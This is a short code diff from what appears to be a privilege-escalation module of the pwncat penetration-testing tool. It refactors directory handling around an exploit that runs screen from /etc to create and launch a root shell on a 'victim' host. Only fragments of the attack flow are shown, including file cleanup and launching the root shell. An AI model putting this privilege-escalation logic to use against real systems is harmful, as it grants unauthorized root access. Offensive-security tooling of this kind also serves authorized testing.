@@ -121,8 +121,7 @@ class Method(BaseMethod):
             raise PrivescError("compilation failed: {exc}")
 
         # Switch to /etc but save our previous directory so we can return to it
-        old_cwd = pwncat.victim.env(["pwd"]).strip().decode("utf-8")
-        pwncat.victim.run("cd /etc")
+        old_cwd = pwncat.victim.chdir("/etc")
 
         # Run screen with our library, saving the umask before changing it
         start_umask = pwncat.victim.run("umask").decode("utf-8").strip()
@@ -145,7 +144,7 @@ class Method(BaseMethod):
         if file_owner != b"0":
 
             # Hop back to the original directory
-            pwncat.victim.env(["cd", old_cwd])
+            pwncat.victim.chdir(old_cwd)
 
             # Ensure the files are removed
             pwncat.victim.env(["rm", "-f", rootshell])
@@ -153,7 +152,7 @@ class Method(BaseMethod):
             raise PrivescError("failed to create root shell")
 
         # Hop back to the original directory
-        pwncat.victim.env(["cd", old_cwd])
+        pwncat.victim.chdir(old_cwd)
 
         # Start the root shell!
         pwncat.victim.run(rootshell, wait=False)
